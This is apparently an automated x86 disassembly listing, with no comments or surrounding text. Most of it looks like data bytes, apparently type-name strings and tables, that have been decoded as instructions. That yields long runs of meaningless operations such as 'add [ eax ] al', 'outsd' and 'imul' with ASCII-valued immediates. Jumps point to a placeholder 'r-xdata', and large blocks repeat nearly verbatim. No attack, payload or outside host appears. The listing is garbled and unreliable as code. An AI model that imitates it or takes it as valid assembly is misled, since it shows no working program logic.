add [ edi ] cl
add [ eax ] al
add ah bl
xor al [ edx ]
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
xor al [ edx ]
mov eax eax
js r-xdata
or al 0x32
inc edx
add [ ebx + 0x423278c0 ] cl
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + esi ] cl
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc edx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or al 0x32
popad
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x3260c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc esp
popad
jae r-xdata
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
inc edx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ edx + esi + 0x42 ] dh
add [ edi ] al
jo r-xdata
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4231e490
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
mov [ edx + eax * 2 ] dh
add [ eax ] al
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4232e090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4234 ] cl
jae r-xdata
rcr [ ebx + esi + 0xb030042 ] 0x54
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
inc esp
outsd
add eax 0x6f4e6d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
push es
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x7004233 ] bl
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
inc edx
jb r-xdata
mov eax eax
pushfd
xor eax [ edx ]
add ecx [ ebx ]
push esp
inc edi
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bl
add [ eax ] al
add [ esp + 0x41 ] bh
inc edx
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ eax ] al
mov al 0x34
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
[ eax + 0x5004249 ]
imul esp [ ebx + 0x73 ] 0xffff0001
nop
xor al 0x35
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] al
inc edx
add [ ebp + esi + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x35 ] dl
inc edx
add [ edx + 0x35 ] bl
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 4 + 0x34 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
push [ eax + 0x46 ]
jo r-xdata
dec ebp
popad
jae r-xdata
inc edx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x339cc08b
inc edx
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc esi
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc ecx
outsb
je r-xdata
inc edx
add [ eax + eax ] ah
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
xor eax 0x355a0042
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x34 ] si
inc edx
add al dh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x42346090
pushad
xor al 0x42
outsd
popad
insb
dec esi
outsd
je r-xdata
nop
inc edi
add [ esp + esi + 0x42 ] dh
insb
add [ eax ] al
adc al 0x34
inc edx
pop edx
xor eax 0x240042
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbdb7 ] al
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
xor al 0x42
imul esp [ ebx + 0x73 ] 0xc08b0000
mov ah 0x34
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc ecx
add ah al
dec ecx
inc edx
inc eax
add al dl
xor al [ eax ]
or [ ecx + 0x42 ] 0x0
fcom [ ebx - 0x6c1fffbf ]
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x20004234 ] dh
jo r-xdata
sub_4230c4
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
and al 0x31
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi ] ah
inc edx
add [ eax + eax ] cl
add [ eax ] al
in al dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004231 ] al
add [ eax ] al
add ah ch
jae r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ ebx ] al
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x4231 ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ ecx + esi + 0x66090042 ] bl
jo r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
jb r-xdata
push 0x65737261
je r-xdata
popa
jne r-xdata
jae r-xdata
popad
insd
nop
hlt
je r-xdata
je r-xdata
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsd
outsb
lea eax [ eax ]
mov al [ 0x3004231 ]
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
adc [ edx ] dh
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add ah bl
xor al [ edx ]
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
xor al [ edx ]
mov eax eax
js r-xdata
or al 0x32
inc edx
add [ ebx + 0x423278c0 ] cl
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + esi ] cl
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc edx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
or al 0x32
popad
jb r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x3260c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc esp
popad
jae r-xdata
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
inc edx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ edx + esi + 0x42 ] dh
add [ edi ] al
jo r-xdata
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4231e490
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
mov [ edx + eax * 2 ] dh
add [ eax ] al
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4232e090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4234 ] cl
jae r-xdata
rcr [ ebx + esi + 0xb030042 ] 0x54
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
inc esp
outsd
add eax 0x6f4e6d70
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
push es
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x7004233 ] bl
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
dec ebp
push eax
outsb
insb
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
inc edx
jb r-xdata
mov eax eax
pushfd
xor eax [ edx ]
add ecx [ ebx ]
push esp
inc edi
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bl
add [ eax ] al
add [ esp + 0x41 ] bh
inc edx
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ eax ] al
mov al 0x34
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
[ eax + 0x5004249 ]
imul esp [ ebx + 0x73 ] 0xffff0001
nop
xor al 0x35
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] al
inc edx
add [ ebp + esi + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x35 ] dl
inc edx
add [ edx + 0x35 ] bl
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 4 + 0x34 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
push [ eax + 0x46 ]
jo r-xdata
dec ebp
popad
jae r-xdata
inc edx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x339cc08b
inc edx
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc esi
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc ecx
outsb
je r-xdata
inc edx
add [ eax + eax ] ah
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
xor eax 0x355a0042
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x34 ] si
inc edx
add al dh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x42346090
pushad
xor al 0x42
outsd
popad
insb
dec esi
outsd
je r-xdata
nop
inc edi
add [ esp + esi + 0x42 ] dh
insb
add [ eax ] al
adc al 0x34
inc edx
pop edx
xor eax 0x240042
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbdb7 ] al
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
xor al 0x42
imul esp [ ebx + 0x73 ] 0xc08b0000
mov ah 0x34
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc ecx
add ah al
dec ecx
inc edx
inc eax
add al dl
xor al [ eax ]
or [ ecx + 0x42 ] 0x0
fcom [ ebx - 0x6c1fffbf ]
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x20004234 ] dh
jo r-xdata
sub_4231f4
add [ esp + edx * 2 ] ecx
inc esi
outsd
outsb
je r-xdata
jb r-xdata
push 0x65737261
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
je r-xdata
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
adc [ edx ] dh
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
xor al [ edx ]
mov eax eax
js r-xdata
or al 0x32
inc edx
add [ ebx + 0x423278c0 ] cl
push ebx
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + esi ] cl
inc edx
add [ esi ] al
jae r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x3260c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc esp
popad
jae r-xdata
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
inc edx
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ edx + esi + 0x42 ] dh
add [ edi ] al
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
outsd
insb
or [ fs : esi + 0x73 ] ah
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
mov [ edx + eax * 2 ] dh
add [ eax ] al
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4232e090
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4234 ] cl
jae r-xdata
rcr [ ebx + esi + 0xb030042 ] 0x54
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
inc esp
outsd
insd
push edi
push 0x5657469
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x7004233 ] bl
dec ebp
jb r-xdata
je r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add ah bl
xor al [ edx ]
push eax
outsb
insb
jb r-xdata
inc ebx
outsd
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
inc esp
popad
jae r-xdata
add [ eax ] al
mov al 0x34
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
[ eax + 0x5004249 ]
imul esp [ ebx + 0x73 ] 0xffff0001
nop
xor al 0x35
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] al
inc edx
add [ ebp + esi + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x35 ] dl
inc edx
add [ edx + 0x35 ] bl
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 4 + 0x34 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax ] bl
add [ eax ] al
add [ esp + 0x41 ] bh
inc edx
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
push [ eax + 0x46 ]
jo r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
inc edx
push 0x6c797453
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x339cc08b
inc edx
or [ eax + 0x6d ] esi
add [ ecx ] al
add ch bh
jae r-xdata
inc edx
jb r-xdata
mov eax eax
pushfd
xor eax [ edx ]
add ecx [ ebx ]
push esp
inc edi
jb r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
inc edx
add [ eax + eax ] ah
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
xor eax 0x355a0042
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x34 ] si
inc edx
add al dh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc ecx
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x42346090
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
pushad
xor al 0x42
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
outsd
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
popad
insb
dec esi
outsd
je r-xdata
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
inc esi
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
outsd
outsb
jo r-xdata
add [ eax ] al
adc al 0x34
inc edx
pop edx
xor eax 0x240042
jo r-xdata
add [ esp + esi + 0x42 ] dh
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
nop
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbdb7 ] al
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
xor al 0x42
imul esp [ ebx + 0x73 ] 0xc08b0000
mov ah 0x34
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
inc ecx
add ah al
dec ecx
inc edx
inc eax
add al dl
xor al [ eax ]
or [ ecx + 0x42 ] 0x0
fcom [ ebx - 0x6c1fffbf ]
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x20004234 ] dh
jo r-xdata
sub_42355b
push esp
inc esi
outsd
outsb
je r-xdata
add al ah
dec esp
xor eax 0x5070042
push esp
inc esi
outsd
outsb
je r-xdata
xor eax 0x34840042
inc edx
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
je r-xdata
add [ edi ] al
add eax 0x6e6f4654
xor [ edx ] al
sbb [ eax ] al
add bh bh
add [ ebx + 0x42 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x4231e074
add al [ eax ]
push es
dec eax
jo r-xdata
popad
insd
pushfd
xor [ edx ] eax
clc
dec ebp
inc edx
add [ eax ] al
dec esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
loopne r-xdata
loopne r-xdata
imul esp [ ebx + 0x73 ] 0x31f00007
inc edx
